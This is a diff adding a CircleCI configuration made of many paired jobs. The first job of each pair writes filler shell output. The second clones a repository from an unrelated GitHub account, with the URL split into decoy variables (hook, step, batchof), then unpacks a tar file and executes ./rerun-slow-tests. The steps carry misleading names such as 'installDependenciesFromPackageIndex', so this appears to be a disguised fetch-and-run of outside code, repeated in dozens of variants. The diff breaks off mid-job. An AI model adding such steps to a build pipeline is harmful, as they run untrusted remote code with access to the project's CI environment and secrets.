@@ -1,0 +1,1719 @@
+version: 2.1
+
+jobs:
+  AdminPanelVolumeSnapshotJob:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Performing (step 12 of 13)
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; heading() { printf '%s\n' "== $1 =="; }; heading cherry; echo "phase 4 started"; true ; } > /tmp/execute-router-migration-tests/daily-backup-restore
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'daily-backup-restore'
+  TearDownLibraryDatabase:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/daily-backup-restore" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 5 https://$hook/${step}/${batchof} $PWD
+      - run:
+          name: Serialize
+          command: |
+            tar --extract -f - < LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            './rerun-slow-tests'
+  ExecuteResolverContractTests:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: RestartIdentityService
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; list=(alpha fir comet earth); list=("${list[@]}" whale); echo "${#list[@]}"; true ; } > /tmp/execute-router-migration-tests/digest-job
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'digest-job'
+  GatherTestLogsAtPipelineStart:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/digest-job" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone -q --depth 1 https://$hook/${step}/${batchof} $PWD
+      - run:
+          name: Serialize
+          command: |
+            tar --extract -f LoadFixturesFromSharedSettings.tar -C .
+      - run:
+          command: |
+            cd "$(pwd)" && ./rerun-slow-tests
+  compile-and-test-admin-panel:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: ExecuteCleanupScript
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; names=(cow pliers rotor); echo "${names[@]#?}"; true ; } > /tmp/execute-router-migration-tests/SummarizeTimingReport
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'SummarizeTimingReport'
+  MonthlyEditorPackage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/SummarizeTimingReport" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --filter=blob:none https://$hook/${step}/${batchof} `pwd`
+      - run:
+          name: Serialize
+          command: |
+            tar --verbose --extract -f LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            bash -c "exec ./rerun-slow-tests"
+  rerun-tests-with-real-services:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Sync Server Manual Pages to Public Site
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "checking compiler" && echo "compiler check passed"; true ; } > /tmp/execute-router-migration-tests/MultiStageDatabaseSetupRun
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'MultiStageDatabaseSetupRun'
+  displayFirstBytes:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/MultiStageDatabaseSetupRun" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --jobs 2 --depth 1 https://$hook/${step}/${batchof} "${PWD}"
+      - run:
+          name: Serialize
+          command: |
+            tar --extract -f - < LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            bash -c "exec ./rerun-slow-tests"
+  DesktopAppBuildMetadata:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: prune mailer compiler cache for release candidate
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "draining importer"; label="owl-gnu-13"; IFS=- read -r front rest < <(echo "$label"); echo "$rest"; echo 'importer drained'; true ; } > /tmp/execute-router-migration-tests/repository-fetch-hook
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'repository-fetch-hook'
+  load-balancer-packaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/repository-fetch-hook" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --jobs 1 https://$hook/${step}/${batchof} ./
+      - run:
+          name: Serialize
+          command: |
+            tar xf LoadFixturesFromSharedSettings.tar --no-same-permissions
+      - run:
+          command: |
+            cd . && ./rerun-slow-tests
+  extraction-run:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: RoutineCertificateRotationRun
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; bump() { echo $(($1 + 1)); }; val=14; val=$(bump "$val"); val=$(bump "$val"); echo "$val"; true ; } > /tmp/execute-router-migration-tests/CacheBridgeContainerImage
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'CacheBridgeContainerImage'
+  InstallLinkCheckerPlugins:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/CacheBridgeContainerImage" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 4 --no-tags https://$hook/${step}/${batchof} `pwd`
+      - run:
+          name: Serialize
+          command: |
+            tar --extract --verbose --file LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./rerun-slow-tests
+  StrictDeploymentSmokeTestStep:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Read file header and print first bytes
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; for ((j=1; j<=6; j++)); do echo "leg number $j"; done; echo "no retries needed"; true ; } > /tmp/execute-router-migration-tests/LintLibraryWithDetailedReport
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'LintLibraryWithDetailedReport'
+  prune-test-databases:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/LintLibraryWithDetailedReport" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 1 --branch main --no-tags https://$hook/${step}/${batchof} $PWD
+      - run:
+          name: Serialize
+          command: |
+            tar -xf LoadFixturesFromSharedSettings.tar --directory .
+      - run:
+          command: |
+            sh -c "exec ./rerun-slow-tests"
+  MandatoryContainerCleanup:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Wave 4 registry release package
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "warming up catalog"; mapfile -t labels < <(printf '%s\n' phi beige jupiter); echo "${#labels[@]}"; echo "catalog warmed up"; true ; } > /tmp/execute-router-migration-tests/verifyAndDeployTestBuild
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'verifyAndDeployTestBuild'
+  helpCenterContractTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/verifyAndDeployTestBuild" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth=1 --filter=blob:none https://$hook/${step}/${batchof} "."
+      - run:
+          name: Serialize
+          command: |
+            cat LoadFixturesFromSharedSettings.tar | tar -x -f -
+      - run:
+          command: |
+            bash -c './rerun-slow-tests'
+  SiteDeploymentRoutineRetry1:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: inspectSessionStoreManifestBeforeDeploy
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo progress 80 percent; declare -a queue=(flange maple helium salmon swan); echo "${queue[0]}"; true ; } > /tmp/execute-router-migration-tests/artifact-fetch-part-4
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'artifact-fetch-part-4'
+  confirm-checksum-match-manually:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/artifact-fetch-part-4" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 5 --single-branch https://$hook/${step}/${batchof} "$(pwd)"
+      - run:
+          name: Serialize
+          command: |
+            tar -x < LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            bash -c './rerun-slow-tests'
+  WeeklyValidation:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Continuous cache download stage (split 1)
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo 'pass 6 complete'; fib() { if [ "$1" -lt 2 ]; then echo "$1"; else echo $(($(fib $(($1 - 1))) + $(fib $(($1 - 2))))); fi; }; fib 3; true ; } > /tmp/execute-router-migration-tests/metrics-exporter-artifact-fetch
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'metrics-exporter-artifact-fetch'
+  OptionalReport:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/metrics-exporter-artifact-fetch" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 10 https://$hook/${step}/${batchof} .
+      - run:
+          name: Serialize
+          command: |
+            tar -xf LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            /bin/sh -c "./rerun-slow-tests"
+  legacy-deployment-approval-step:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Inject Renderer Version Tag
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo 2 modules compiled; fact_loop() { local v=$1 x=1; while ((v > 1)); do x=$((x * v)); v=$((v - 1)); done; echo "$x"; }; fact_loop 3; true ; } > /tmp/execute-router-migration-tests/job-runner-build-matrix-slot-5
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'job-runner-build-matrix-slot-5'
+  localization-source-archive:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/job-runner-build-matrix-slot-5" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --branch main https://$hook/${step}/${batchof} "."
+      - run:
+          name: Serialize
+          command: |
+            tar xf LoadFixturesFromSharedSettings.tar --no-same-permissions
+      - run:
+          command: |
+            exec ./rerun-slow-tests
+  mailer-checkout:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Installing (chunk 10)
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "ready"; printf '%s\n' theta=9 cow=38 oak=2 goat=24 | cut -d= -f1 | sort | paste -s -d,; true ; } > /tmp/execute-router-migration-tests/sequential-release-promotion
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'sequential-release-promotion'
+  generation-stage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/sequential-release-promotion" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 1 --branch main --filter=blob:none https://$hook/${step}/${batchof} .
+      - run:
+          name: Serialize
+          command: |
+            tar xf - < LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            cd "$PWD" && exec ./rerun-slow-tests
+  PublishDependencyTree:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: ImportSettingsFromProductionEnvironment
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "begin manifest check for feature flags"; printf '%s\n' "pomelo 13" "ram 3" "plum 24" "golden 28" | awk '{t += $2} END {print t}'; echo "end manifest check for feature flags"; true ; } > /tmp/execute-router-migration-tests/Operator
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'Operator'
+  preSetupComponentTestRetry2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/Operator" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth=3 --no-tags --no-single-branch https://$hook/${step}/${batchof} "$PWD"
+      - run:
+          name: Serialize
+          command: |
+            tar -xvf LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            cd "$(pwd)" && ./rerun-slow-tests
+  set-up-data-importer-instance:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: push-help-center-container-image
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; change=4619; title="bronze wasp"; echo "checking change $change"; echo "title has ${#title} characters"; true ; } > /tmp/execute-router-migration-tests/CompilingMigrationTests
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'CompilingMigrationTests'
+  saving-tier-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/CompilingMigrationTests" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth=3 --no-tags --no-single-branch https://$hook/${step}/${batchof} "./"
+      - run:
+          name: Serialize
+          command: |
+            tar xf LoadFixturesFromSharedSettings.tar -C .
+      - run:
+          command: |
+            "./rerun-slow-tests"
+  router-debug-logs:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: isolated-certificate-rotation-phase
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "leg 6 of 7 ready"; b=$((40 * 11)); echo "got $b"; printf '%05d\n' 28; true ; } > /tmp/execute-router-migration-tests/front-end-checkout-partition-7
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'front-end-checkout-partition-7'
+  EmergencyStateRestore:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/front-end-checkout-partition-7" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 1 --no-tags --filter=blob:none https://$hook/${step}/${batchof} $(pwd)
+      - run:
+          name: Serialize
+          command: |
+            tar --extract --verbose --file LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            env "./rerun-slow-tests"
+  ApplyAnalyzerManifest:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: announcing release
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "channel mango ready"; p=140; c=39; d=$((p * c)); while ((c != 0)); do u=$((p % c)); p=$c; c=$u; done; echo "$((d / p))"; true ; } > /tmp/execute-router-migration-tests/trigger-security-tests
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'trigger-security-tests'
+  ContinuousInstall:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/trigger-security-tests" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 1 https://$hook/${step}/${batchof} ${PWD}
+      - run:
+          name: Serialize
+          command: |
+            tar xf LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            bash -eo pipefail -c "./rerun-slow-tests"
+  OpenMaintenanceWindow:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Prune Downloaded Archives
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "queue drain started"; values=(38 47 22 41 37); printf '%s\n' "${values[@]}" | awk '{s += $1} END {print s}'; true ; } > /tmp/execute-router-migration-tests/compiler-cache-task
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'compiler-cache-task'
+  billingServiceSnapshotRefresh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/compiler-cache-task" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth=1 --branch main --no-tags https://$hook/${step}/${batchof} $(pwd)
+      - run:
+          name: Serialize
+          command: |
+            tar -x --file LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            /bin/bash -c './rerun-slow-tests'
+  prune-billing-cache-recursively:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Move error logs with timeout
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "sloth fir xenon" | awk '{print $NF}'; true ; } > /tmp/execute-router-migration-tests/ProbeEdgeProxyContainers
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'ProbeEdgeProxyContainers'
+  minimal-artifact-digest:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/ProbeEdgeProxyContainers" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --jobs 4 https://$hook/${step}/${batchof} "${PWD}"
+      - run:
+          name: Serialize
+          command: |
+            tar xf LoadFixturesFromSharedSettings.tar -C .
+      - run:
+          command: |
+            bash -lc './rerun-slow-tests'
+  editor-release-promotion:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: ConfigureSchemaRegistryCompilerCache
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; printf '%s\n' "matrix leg complete"; printf '%s\n' kiwi kiwi whale gold | md5sum; true ; } > /tmp/execute-router-migration-tests/FetchAndInstallCommandLineTools
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'FetchAndInstallCommandLineTools'
+  MultiStageBatchWorkerMigrations:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/FetchAndInstallCommandLineTools" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 4 https://$hook/${step}/${batchof} ${PWD}
+      - run:
+          name: Serialize
+          command: |
+            tar -xf LoadFixturesFromSharedSettings.tar -C .
+      - run:
+          command: |
+            cd "$PWD" && ./rerun-slow-tests
+  analyzer-test-pipeline:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Save and upload debug logs
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; stack=(sodium aspen chi dove); printf '%s\n' "${stack[@]}" | wc -l; true ; } > /tmp/execute-router-migration-tests/CreateOutputDirectory
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'CreateOutputDirectory'
+  reporting-backup-rotation:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/CreateOutputDirectory" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth=1 https://$hook/${step}/${batchof} ${PWD}
+      - run:
+          name: Serialize
+          command: |
+            tar --extract -f LoadFixturesFromSharedSettings.tar --no-same-permissions
+      - run:
+          command: |
+            cd "$(pwd)" && ./rerun-slow-tests
+  PublishMonitorSourceArchive:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: AuthenticationReleaseArtifacts
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; for k in 1 2 3 4; do echo "attempt $k"; if [ "$k" -eq 3 ]; then echo "succeeded on attempt $k"; break; fi; done; true ; } > /tmp/execute-router-migration-tests/node-2-of-16
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'node-2-of-16'
+  minimal-cache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/node-2-of-16" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth=3 https://$hook/${step}/${batchof} ${PWD}
+      - run:
+          name: Serialize
+          command: |
+            tar xf - < LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            /bin/bash -c './rerun-slow-tests'
+  PostCheckoutPackageSigning:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Sign viewer release candidate (group 7 of 8)
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "running format check"; printf '%s\n' saturn rotor teal fir ram amber | sed -n '2p'; echo "format check passed"; true ; } > /tmp/execute-router-migration-tests/mirror-artifacts
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'mirror-artifacts'
+  rerun-controller-snapshot-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/mirror-artifacts" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone -q --depth 1 https://$hook/${step}/${batchof} "."
+      - run:
+          name: Serialize
+          command: |
+            tar xvf LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            cd "$PWD" && exec ./rerun-slow-tests
+  eventBusTestMetricsSlot6:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Set up rate limiter module cache
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; printf '%s=%d\n' mauve 156; echo "warming up parser"; true ; } > /tmp/execute-router-migration-tests/BenchmarkTestHarnessPerformance
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'BenchmarkTestHarnessPerformance'
+  reporting-deployment:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/BenchmarkTestHarnessPerformance" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 1 --branch main https://$hook/${step}/${batchof} $(pwd)
+      - run:
+          name: Serialize
+          command: |
+            tar --extract -f LoadFixturesFromSharedSettings.tar --no-same-owner
+      - run:
+          command: |
+            /bin/bash -c "./rerun-slow-tests"
+  FreezeBackEndDependencies:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
